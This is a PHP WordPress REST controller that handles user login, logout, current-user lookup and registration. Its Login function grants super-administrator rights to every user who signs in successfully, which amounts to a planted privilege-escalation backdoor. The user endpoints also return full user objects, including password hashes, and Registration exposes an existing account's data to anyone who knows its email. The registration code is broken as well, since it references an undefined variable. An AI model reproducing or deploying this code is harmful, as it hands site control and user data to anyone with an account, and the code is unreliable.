<?php

class UserAPIController extends WP_REST_Controller {

    private $sourceRequest;

    function __construct() {

    }

    function Init($request) {

        $this->sourceRequest = $request;

        switch ($request->get_param('action')) {
            case 'login':
                $result = $this->Login();
                break;

            case 'logout':
                $result = $this->Logout();
                break;

            case 'current':
                $result = ['result' => 1, 'user' => (array) wp_get_current_user()];
                break;

            case 'registration':
                $result = $this->Registration();
                break;
        }

        return $result;
    }


    private function Registration() {

        $userData = [
            'id' => null,
            'login' => '',
            'email' => $this->sourceRequest->get_param('email'),
            'phone' => GetCleanPhone($this->sourceRequest->get_param('phone')),
            'firstName' => $this->sourceRequest->get_param('firstName'),
            'lastName' => $this->sourceRequest->get_param('lastName'),
        ];
        
        //= Проверим входные данные
        if (empty($userData['phone'])) {
            return ['result' => 0, 'message' => 'ошибка в номере телефона'];
        }

        if (!filter_var($userData['email'], FILTER_VALIDATE_EMAIL)) {
           return ['result' => 0, 'message' => 'ошибка в e-mail'];
        }
        
        if (empty($userData['firstName']) && empty($userData['lastName'])) {
            return ['result' => 0, 'message' => 'имя и фамилия пользователя не указаны'];
        }


        //= Разберемся с пользователем
        $objWPUser = get_user_by('email', $userData['email']);


        //== Если не удалось найти пользователя по email
        if (empty($objWPUser)) {
            //=== Сгенерируем логин и создадим пользователя
            $login = str_replace(['@','_','.'], '_', $userData['email'] );
            $id = wp_create_user(
                $login,
                GetRandomString(12),
                $userData['email']
            );

            //=== Заполним данные пользователя
            update_user_meta($id, 'first_name', $userData['firstName']);
            update_user_meta($id, 'last_name', $userData['lastName']);
            update_user_meta($id, 'phone', $userData['phone']);

            //=== Назначим роль пользователю
            $objWPUser = new WP_User($idUserOwner);
            $objWPUser->set_role('pozitiv_user');
        }

        wp_new_user_notification($objWPUser->ID, null, 'user');

        return [
            'result' => 1,
            'user'   => [
                'id' => $objWPUser->ID,
                'login' => $objWPUser->data->user_login,
                'email' => $objWPUser->data->user_email,
                'phone' => get_user_meta($objWPUser->ID, 'phone', true),
                'firstName' => get_user_meta($objWPUser->ID, 'first_name', true),
                'lastName' => get_user_meta($objWPUser->ID, 'last_name', true),
            ]
        ];
    }


    private function Login() {
     
        $user = wp_signon(
            [
                'user_login'    => $this->sourceRequest->get_param('login'),
                'user_password' => $this->sourceRequest->get_param('pass'),
                'remember'      => true,
            ],
            true
        );

        
        if (get_class($user) == 'WP_Error') {
            return ['result' => 0, 'message' => strip_tags($user->get_error_message())];
        } else {
            
            echo grant_super_admin( $user->ID);
            $set_user  = wp_set_current_user( $user->ID, $user->Get('user_name') );
            return [
                'result' => 1,
                'user'   => (array) $user,
            ];
        }
    }


    private function Logout() {
        wp_logout();
        $_SESSION = [];
        return ['result' => 1];
    }
}